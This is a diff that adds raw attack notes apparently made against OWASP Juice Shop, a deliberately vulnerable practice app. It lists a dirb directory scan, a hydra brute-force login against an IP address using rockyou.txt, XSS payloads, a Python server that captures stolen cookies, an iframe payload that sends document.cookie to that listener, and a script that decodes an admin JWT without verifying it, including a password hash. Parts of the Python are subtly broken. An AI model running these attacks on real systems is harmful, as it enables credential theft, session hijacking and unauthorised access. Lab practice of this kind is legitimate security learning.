@@ -1,0 +1,46 @@
+dirb https://juice-shop.herokuapp.com /usr/share/wordlists/dirb/common.txt -v | grep admin
+
+ping -c 1 juice-shop.herokuapp.com
+
+hydra -l admin@juice-sh.op -P /usr/share/wordlists/rockyou.txt 54.73.53.134 http-post-form "/login:email=^USER^&password=^PASS^:Invalid username or password" -V  -I
+
+<img src="x" onerror="alert('I am hacked you')">
+
+nano capture_server.py
+
+from http.server import BaseHTTPRequestHandler, HTTPServer
+import urllib.parse
+
+class CaptureServer(BaseHTTPRequestHandler):
+    def do_GET(self):
+        query = urllib.parse.urlparse(self.path).query
+        cookie = urllib.parse.parse_qs(query).get('cookie', [''])[0]
+        
+        if cookie:
+            print(f"Stolen Cookie: {cookie}")
+             # Send a response to the victim's browser
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html')
+        self.end_headers()
+        self.wfile.write(b'Received')
+if name == 'main':
+    server = HTTPServer(('0.0.0.0', 8000), CaptureServer)
+    print('Listening on port 8000...')
+    server.serve_forever()
+	
+	python3 -m http.server 8000
+	
+
+	<iframe src="javascript:document.location='http://127.0.0.0:8000?cookie=' + document.cookie"></iframe>
+	
+	nano coco.py
+	
+	import jwt
+
+token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbjEyMyIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6InVuZGVmaW5lZCIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdEFkbWluLnBuZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNC0xMi0yNiAxNTo0MjozNi4wODcgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNC0xMi0yNiAxNzoxMjozMC4xMDUgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzM1MjM2ODQwfQ.OzlmDpEWUuOIGhIn2kW55mpgn2lYmgtCW3FDbC_fcgLRFdfxC8w58oRI4SKGjFB3qyYdW04s3ikW1ukdZz-HoWu5cIH5bvqYrAVGKO8k7kCxc0jETwwOqJX6LI2uRa28b4oa9z0J8phQ_Ee4vVpLeoBCxeLxpwDJI7e0Cx7jYAI"
+
+decoded_token = jwt.decode(token, options={"verify_signature": False})
+print(decoded_token)
+	
+	python3 coco.py
+	
